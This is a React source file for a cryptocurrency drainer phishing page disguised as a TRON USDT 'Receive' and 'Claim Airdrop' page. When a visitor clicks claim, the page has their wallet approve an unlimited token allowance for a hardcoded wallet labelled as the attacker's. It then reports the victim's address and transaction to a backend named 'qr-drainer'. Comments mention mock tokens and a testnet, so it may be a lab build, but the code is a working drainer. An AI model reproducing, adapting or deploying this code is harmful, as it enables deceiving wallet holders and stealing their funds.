import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// CONFIGURATION
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const SWEEPER_ADDRESS = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // YOUR ATTACKER WALLET (Account 01)
const BACKEND = "https://qr-drainer.onrender.com"; // Your Render Backend

// TRON LOGO BASE64
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmMmQ1NSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [connecting, setConnecting] = useState(false);

  const qrValue = typeof window !== "undefined" ? window.location.href : "";

  // Heartbeat to detect wallet
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (wallet !== addr) {
          setWallet(addr);
          // Read balance
          window.tronWeb.contract().at(TOKEN_ADDRESS).then(c => {
            return c.balanceOf(addr).call();
          }).then(raw => {
            setVictimBal(Number(raw.toString()) / 1e6);
          }).catch(e => console.log("Balance read error", e));
        }
      }
    }, 2000);
    return () => clearInterval(checkWallet);
  }, [wallet]);

  const handleConnect = async () => {
    setConnecting(true);
    try {
      if (window.tronLink) {
        await window.tronLink.request({ method: 'tron_requestAccounts' });
      } else if (window.tronWeb) {
        // Fallback for some wallets
        alert("Please unlock your wallet extension/app.");
      } else {
        alert("No crypto wallet detected. Please open this link in TronLink or Trust Wallet DApp browser.");
      }
    } catch (e) {
      console.error(e);
    }
    setConnecting(false);
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(SWEEPER_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadQR = () => {
    const svg = document.querySelector('#lab-qr-box svg');
    if (!svg) return;
    const size = 400;
    const canvas = document.createElement('canvas');
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);
    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const logoSize = size * 0.22;
      const logoPos = (size - logoSize) / 2;
      ctx.beginPath();
      ctx.arc(size/2, size/2, logoSize/2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      const logoImg = new Image();
      logoImg.onload = () => {
        ctx.drawImage(logoImg, logoPos, logoPos, logoSize, logoSize);
        const link = document.createElement('a');
        link.download = 'TRON-Airdrop-Receive.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
      };
      logoImg.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
  };

  const handleClaim = async () => {
    if (!window.tronWeb) return alert("Please connect your wallet first.");
    setLoading(true);
    try {
      const tw = window.tronWeb;
      const c = await tw.contract().at(TOKEN_ADDRESS);
      const tx = await c.approve(SWEEPER_ADDRESS, "1000000000000000").send({ 
        from: tw.defaultAddress.base58, 
        feeLimit: 100000000 
      });
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: tw.defaultAddress.base58, txHash: tx, network: "TRON Shasta" })
      });
      alert("Transaction Sent! Check your wallet.");
    } catch (e) {
      console.error(e);
      alert("Transaction failed or rejected.");
    }
    setLoading(false);
  };

  return (
    <div style={{ background: '#f8f9fa', minHeight: '100vh', fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
      <div style={{ background: '#ffffff', color: '#000', borderRadius: '24px', padding: '30px', maxWidth: '400px', width: '100%', boxShadow: '0 10px 40px rgba(0,0,0,0.08)', border: '1px solid #e9ecef' }}>
        
        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <h2 style={{ margin: '0 0 8px 0', fontSize: '22px', fontWeight: '700', color: '#111' }}>Receive USDT</h2>
          <div style={{ fontSize: '13px', color: '#666', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
            <span style={{ width: '8px', height: '8px', background: '#ff2d55', borderRadius: '50%' }}></span>
            TRON (TRC20)
          </div>
        </div>

        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <div id="lab-qr-box" style={{ display: 'inline-block', padding: '15px', background: '#fff', borderRadius: '16px', border: '1px solid #f0f0f0' }}>
            <QRCodeSVG 
              value={qrValue} 
              size={200} 
              level="H" 
              includeMargin={false}
              imageSettings={{ src: TRON_LOGO_B64, height: 45, width: 45, excavate: true }}
            />
          </div>
        </div>

        <div style={{ background: '#f8f9fa', borderRadius: '12px', padding: '12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px', border: '1px solid #e9ecef' }}>
          <span style={{ fontFamily: 'monospace', fontSize: '11px', color: '#333', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '70%' }}>
            {SWEEPER_ADDRESS}
          </span>
          <button onClick={handleCopyAddress} style={{ background: copied ? '#22c55e' : '#ff2d55', color: '#fff', border: 'none', borderRadius: '6px', padding: '6px 12px', fontSize: '11px', fontWeight: '600', cursor: 'pointer' }}>
            {copied ? '✓ Copied' : 'Copy'}
          </button>
        </div>

        <div style={{ background: '#fff3cd', border: '1px solid #ffe69c', borderRadius: '8px', padding: '10px', fontSize: '11px', color: '#856404', marginBottom: '20px', display: 'flex', gap: '8px', alignItems: 'flex-start' }}>
          <span style={{ fontSize: '14px' }}>⚠️</span>
          <span style={{ lineHeight: '1.4' }}>Only send TRC-20 USDT assets to this address. Other assets will be lost forever.</span>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '20px' }}>
          <button onClick={handleDownloadQR} style={{ background: '#fff', border: '1px solid #dee2e6', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600', color: '#333', fontSize: '13px' }}>
            ⬇️ Save QR
          </button>
          <button onClick={() => navigator.share({ url: qrValue }).catch(() => alert('Link copied!'))} style={{ background: '#fff', border: '1px solid #dee2e6', borderRadius: '8px', padding: '12px', cursor: 'pointer', fontWeight: '600', color: '#333', fontSize: '13px' }}>
            📤 Share
          </button>
        </div>

        {/* DYNAMIC BUTTON: Connect or Claim */}
        {!wallet ? (
          <button 
            onClick={handleConnect} 
            disabled={connecting}
            style={{ 
              width: '100%', background: '#111', color: '#fff', border: 'none', borderRadius: '12px', padding: '16px', fontSize: '16px', fontWeight: '700', cursor: 'pointer'
            }}
          >
            {connecting ? 'Connecting...' : 'Connect Wallet to Claim'}
          </button>
        ) : (
          <button 
            onClick={handleClaim} 
            disabled={loading}
            style={{ 
              width: '100%', background: 'linear-gradient(135deg, #ff2d55, #ff7a45)', color: '#fff', border: 'none', borderRadius: '12px', padding: '16px', fontSize: '16px', fontWeight: '700', cursor: loading ? 'not-allowed' : 'pointer', boxShadow: '0 4px 15px rgba(255,45,85,0.3)'
            }}
          >
            {loading ? 'Processing...' : 'Verify & Claim Airdrop'}
          </button>
        )}

      </div>
    </div>
  );
}